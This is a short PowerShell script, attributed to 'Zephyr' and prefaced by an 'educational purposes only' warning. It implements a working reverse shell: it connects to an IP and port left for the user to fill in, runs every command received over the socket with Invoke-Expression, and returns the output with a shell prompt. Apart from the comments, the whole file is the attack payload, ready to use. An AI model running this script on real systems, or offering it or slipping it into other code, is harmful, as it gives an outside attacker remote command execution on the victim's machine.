# Developed by Zephyr
# WARNING: This script is intended for educational purposes only. 
# NEVER USE THIS PAYLOAD FOR ILLEGAL ACTIVITIES. Unauthorized use 
# of this script can result in serious legal consequences. Use 
# responsibly and only in environments where you have explicit permission.

# Define the IP address and port for the connection
$ip = '127.0.0.1' # Replace this
$port = 1234 # Replace this

# Create a TCP client and connect to the specified IP and port
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()  # Get the network stream for reading and writing

# Initialize a byte array to hold incoming data
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

# Continuously read data from the stream
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert the received bytes to a string
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute the received command and capture the output
    $sendback = try {
        Invoke-Expression $data 2>&1 | Out-String
    } catch {
        $_.Exception.Message
    }
    
    # Append the current PowerShell prompt to the output
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    
    # Convert the output to bytes and send it back to the server
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush() # Ensure all data is sent
}

# Close the TCP connection
$client.Close()

